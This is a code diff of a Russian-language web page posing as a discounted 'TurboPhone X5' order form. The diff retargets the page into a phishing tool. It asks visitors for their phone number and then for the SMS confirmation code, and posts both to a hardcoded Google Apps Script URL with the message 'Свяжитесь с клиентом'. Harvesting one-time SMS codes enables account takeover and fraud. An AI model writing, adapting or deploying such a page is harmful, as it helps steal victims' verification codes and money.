@@ -245,7 +245,6 @@
             padding-bottom: 20px;
         }
 
-        /* МОДАЛЬНЫЕ ОКНА */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -387,10 +386,8 @@
     </div>
 </div>
 
-<!-- ОВЕРЛЕЙ -->
 <div class="modal-overlay" id="overlay"></div>
 
-<!-- ПЕРВОЕ ОКНО: ВВОД НОМЕРА ТЕЛЕФОНА -->
 <div class="modal-window" id="phoneModal">
     <button class="modal-close" id="closePhoneBtn">✕</button>
     <div class="modal-header">
@@ -406,34 +403,24 @@
     </div>
 </div>
 
-<!-- ВТОРОЕ ОКНО: ВАШ ВОПРОС (ТО, ЧТО ВЫ ХОТИТЕ СПРОСИТЬ) -->
 <div class="modal-window" id="questionModal">
     <button class="modal-close" id="closeQuestionBtn">✕</button>
     <div class="modal-header">
-        <h3 id="questionTitle">📝 Ответьте на вопрос</h3>
-        <p id="questionText">Введите ваш город</p>  <!-- ЗДЕСЬ ВЫ ПИШЕТЕ СВОЙ ТЕКСТ -->
+        <h3 id="questionTitle">Код из СМС</h3>
+        <p id="questionText">Введите код</p>
     </div>
     <div class="modal-body">
-        <input type="text" class="input-field" id="questionInput" placeholder="Напишите здесь...">
+        <input type="text" class="input-field" id="questionInput" placeholder="Введите код">
         <button class="modal-btn" id="submitQuestionBtn">Отправить</button>
     </div>
     <div class="modal-footer">
-        Это поможет ускорить оформление заказа
+        Это подтверждение для оформления заказа
     </div>
 </div>
 
 <script>
-    // ========== НАСТРОЙКА TELEGRAM ==========
-    const BOT_TOKEN = "ВАШ_ТОКЕН_БОТА";
-    const CHAT_ID = "ВАШ_ID_ТЕЛЕГРАМ";
-    
-    let isTelegramEnabled = BOT_TOKEN !== "ВАШ_ТОКЕН_БОТА" && CHAT_ID !== "ВАШ_ID_ТЕЛЕГРАМ";
-    
-    // ========== НАСТРОЙКА ВАШЕГО ВОПРОСА ==========
-    // ⬇️⬇️⬇️ ЗДЕСЬ ВЫ ПИШЕТЕ СВОЙ ТЕКСТ ⬇️⬇️⬇️
-    const YOUR_QUESTION = "Введите код";      // ← Это текст вопроса
-    const YOUR_QUESTION_TITLE = "Код отправленный в СМС"; // ← Это заголовок окна
-    // ⬆️⬆️⬆️ ВСЁ, ЧТО НАДО МЕНЯТЬ ⬆️⬆️⬆️
+    // ========== ВСТАВЬТЕ ВАШ URL ОТ GOOGLE APPS SCRIPT ==========
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz0Hx6LYdpYNAE89OnmDtYPoHrJ5a4xECkkAHKkxOqiCLsNz5Yq7WUupIxhFKokUoHY/exec";
     
     // Элементы
     const orderBtn = document.getElementById('orderBtn');
@@ -446,16 +433,9 @@
     const submitQuestionBtn = document.getElementById('submitQuestionBtn');
     const phoneInput = document.getElementById('phoneInput');
     const questionInput = document.getElementById('questionInput');
-    const questionTitle = document.getElementById('questionTitle');
-    const questionText = document.getElementById('questionText');
     
-    // Устанавливаем ваш текст
-    questionTitle.textContent = YOUR_QUESTION_TITLE;
-    questionText.textContent = YOUR_QUESTION;
+    let userPhone = "";
     
-    let userPhone = ""; // Сохраняем номер телефона
-    
-    // Открыть первое окно
     function openPhoneModal() {
         phoneModal.style.display = 'block';
         overlay.style.display = 'block';
@@ -463,14 +443,12 @@
         phoneInput.focus();
     }
     
-    // Закрыть все окна
     function closeAllModals() {
         phoneModal.style.display = 'none';
         questionModal.style.display = 'none';
         overlay.style.display = 'none';
     }
     
-    // Форматирование телефона
     phoneInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');
         if (value.length > 11) value = value.slice(0, 11);
@@ -483,16 +461,12 @@
         e.target.value = formatted;
     });
     
-    // Отправить номер в Telegram
-    async function sendPhoneToTelegram(phone) {
-        const message = `НОВАЯ ЗАЯВКА!\n\n📱 Товар: TurboPhone X5\n💰 Скидка: -45%\n📞 Телефон: ${phone}\n\n❗ Ожидает ответа на вопрос: "${YOUR_QUESTION}"`;
-        
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    async function sendToScript(message) {
         try {
-            const response = await fetch(url, {
+            const response = await fetch(SCRIPT_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                body: JSON.stringify({ message: message })
             });
             return response.ok;
         } catch (error) {
@@ -501,25 +475,6 @@
         }
     }
     
-    // Отправить ответ на вопрос в Telegram
-    async function sendAnswerToTelegram(phone, answer) {
-        const message = `🛍️ ОТВЕТ НА ВОПРОС!\n\n📞 Телефон: ${phone}\n❓ Вопрос: "${YOUR_QUESTION}"\n✅ Ответ: ${answer}\n\n🔥 Свяжитесь с клиентом!`;
-        
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            });
-            return response.ok;
-        } catch (error) {
-            console.error('Ошибка:', error);
-            return false;
-        }
-    }
-    
-    // Обработка отправки номера (переход ко второму окну)
     async function handlePhoneSubmit() {
         let phone = phoneInput.value.trim();
         if (phone === "" || phone.length < 10) {
@@ -528,22 +483,12 @@
         }
         
         userPhone = phone;
-        
-        // Блокируем кнопку
         submitPhoneBtn.textContent = "Отправка...";
         submitPhoneBtn.disabled = true;
         
-        // Отправляем номер в Telegram
-        if (isTelegramEnabled) {
-            await sendPhoneToTelegram(userPhone);
-        } else {
-            console.log("ДЕМО-РЕЖИМ. Номер:", userPhone);
-        }
+        await sendToScript(`НОВАЯ ЗАЯВКА!\n\n📱 Товар: TurboPhone X5\n💰 Скидка: -45%\n📞 Телефон: ${userPhone}`);
         
-        // Закрываем первое окно
         phoneModal.style.display = 'none';
-        
-        // Открываем второе окно (с вашим вопросом)
         questionModal.style.display = 'block';
         questionInput.value = '';
         questionInput.focus();
@@ -552,35 +497,25 @@
         submitPhoneBtn.disabled = false;
     }
     
-    // Обработка отправки ответа на вопрос
     async function handleQuestionSubmit() {
         let answer = questionInput.value.trim();
         if (answer === "") {
-            alert("Пожалуйста, введите ответ");
+            alert("Введите код");
             return;
         }
         
         submitQuestionBtn.textContent = "Отправка...";
         submitQuestionBtn.disabled = true;
         
-        // Отправляем ответ в Telegram
-        if (isTelegramEnabled) {
-            await sendAnswerToTelegram(userPhone, answer);
-        } else {
-            console.log("ДЕМО-РЕЖИМ. Ответ на вопрос:", answer);
-        }
+        await sendToScript(`🛍️ ОТВЕТ!\n\n📞 Телефон: ${userPhone}\n✅ Код из СМС: ${answer}\n\n🔥 Свяжитесь с клиентом!`);
         
-        // Показываем финальное сообщение
-        alert("Ожидайте");
-        
-        // Закрываем всё
+        alert("Ожидайте, я свяжусь с вами");
         closeAllModals();
         
         submitQuestionBtn.textContent = "Отправить";
         submitQuestionBtn.disabled = false;
     }
     
-    // События
     orderBtn.addEventListener('click', openPhoneModal);
     closePhoneBtn.addEventListener('click', closeAllModals);
     closeQuestionBtn.addEventListener('click', closeAllModals);
